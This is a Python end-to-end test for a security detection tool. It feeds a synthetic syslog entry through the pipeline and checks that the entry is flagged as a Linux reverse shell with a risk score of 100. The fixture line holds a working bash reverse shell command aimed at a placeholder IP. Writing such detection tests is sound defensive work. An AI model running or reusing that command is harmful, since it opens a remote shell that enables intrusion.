import json
import re

from dataclasses import replace

from src.config.app_config import default_app_config
from src.detection.linux.linux_pipeline import (
    run_linux_detection_pipeline,
)
from src.main import main


def test_linux_reverse_shell_risk_survives_full_pipeline(
    tmp_path,
    monkeypatch,
):
    syslog_file = tmp_path / "syslog"

    syslog_file.write_text(
        "Jul  7 10:00:01 linux-risk-e2e python3[123]: "
        "command=/bin/bash -i >& "
        "/dev/tcp/203.0.113.50/4444 0>&1\n",
        encoding="utf-8",
    )

    json_output = tmp_path / "report.json"
    html_output = tmp_path / "report.html"

    config = replace(
        default_app_config(),
        linux_auth_file=str(tmp_path / "missing-auth.log"),
        linux_syslog_file=str(syslog_file),
        linux_syslog_source_year=2026,
        linux_syslog_source_timezone="Asia/Jerusalem",
        json_output_file=str(json_output),
        html_output_file=str(html_output),
    )

    observed = {}

    def recording_linux_pipeline(**kwargs):
        result = run_linux_detection_pipeline(**kwargs)

        # Snapshot numeric values before Cross-Domain
        # mutates ThreatFinding objects in place.
        observed["reverse_shell_scores"] = [
            (
                finding.risk_score_base,
                finding.risk_score,
            )
            for finding in result.findings
            if finding.title == "Linux Reverse Shell Detected"
            and finding.hostname == "linux-risk-e2e"
        ]

        observed["reverse_shell_versions"] = [
            finding.scoring_version
            for finding in result.findings
            if finding.title == "Linux Reverse Shell Detected"
            and finding.hostname == "linux-risk-e2e"
        ]

        observed["reverse_shell_sources"] = [
            finding.risk_base_sources.copy()
            for finding in result.findings
            if finding.title == "Linux Reverse Shell Detected"
            and finding.hostname == "linux-risk-e2e"
        ]

        return result

    monkeypatch.setattr(
        "src.main.run_linux_detection_pipeline",
        recording_linux_pipeline,
    )

    # Real application, parser, detectors, scoring
    # and report generation.
    main(config)

    assert observed["reverse_shell_versions"] == ["1.0"]
    assert observed["reverse_shell_scores"] == [
        (100, 100)
    ]
    assert observed["reverse_shell_sources"] == [
        {"linux_advanced": 100}
    ]

    assert json_output.is_file()
    assert html_output.is_file()

    report = json.loads(
        json_output.read_text(encoding="utf-8")
    )

    reverse_shell_findings = [
        finding
        for finding in report["findings"]
        if finding.get("title") == "Linux Reverse Shell Detected"
        and finding.get("hostname") == "linux-risk-e2e"
    ]

    assert len(reverse_shell_findings) == 1

    finding = reverse_shell_findings[0]

    assert re.fullmatch(
        r"[0-9a-f]{64}",
        finding["scoring_policy_hash"],
    )

    assert finding["risk_base_sources"]["linux_advanced"] == 100
    assert "global_policy" in finding["risk_base_sources"]

    assert finding["risk_score_base"] == 100
    assert finding["risk_score"] == 100
    assert finding["scoring_version"] == "1.0"

    assert isinstance(finding["risk_factors"], dict)

    html_report = html_output.read_text(
        encoding="utf-8"
    )

    assert "Linux Reverse Shell Detected" in html_report
